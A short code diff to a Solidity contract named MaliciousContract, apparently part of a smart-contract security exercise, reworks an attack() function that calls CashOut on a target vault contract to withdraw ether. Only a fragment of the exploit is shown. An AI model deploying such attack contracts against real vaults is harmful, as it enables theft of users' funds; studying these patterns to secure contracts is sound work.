@@ -10,9 +10,9 @@ contract MaliciousContract{
         eth_VAULT= ETH_VAULT (_eth_Vault);
     }
 
-    function attack() public payable{
-        require(msg.value >= 1 ether, "Must send at least 1 ether");
-        eth_VAULT.CashOut(msg.value);
+   function attack(uint amount) public {
+        require(amount >= 1 ether, "Must attempt and attack with at least 1 ether");
+         eth_VAULT.CashOut(amount);
     }
 
     function deposit()  public payable{
